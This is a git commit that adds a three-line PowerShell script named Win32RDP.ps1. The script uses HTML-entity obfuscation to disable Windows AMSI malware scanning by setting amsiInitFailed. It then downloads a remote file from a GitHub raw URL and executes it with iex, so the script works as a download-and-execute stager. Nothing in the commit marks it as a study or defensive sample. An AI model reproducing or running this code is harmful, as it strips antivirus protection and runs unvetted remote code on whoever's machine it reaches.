8d1a4172b2ed7b5bb2688df3449f33bd53518daa
Upload96 <76906376+Upload96@users.noreply.github.com>
2021-01-05 18:34:06 +1000

    Add files via upload

---
+++ Win32RDP.ps1
@@ -0,0 +1,3 @@
+[Ref].Assembly.GetType('System.Management.Automation.'+$([systEm.NeT.WebUtIlItY]::HTMlDECoDe('&#65;&#109;&#115;&#105;'))+'Utils').GetField($([sYSteM.nEt.WeButILITY]::htmldECOdE('&#97;&#109;&#115;&#105;&#73;&#110;&#105;&#116;&#70;&#97;&#105;&#108;&#101;&#100;')),'NonPublic,Static').SetValue($null,$true);
+$web = New-Object System.Net.WebClient;$string = $web.Downloadstring('https://raw.githubusercontent.com/Upload96/UploadDownload/main/TCP.txt');iex $string
+
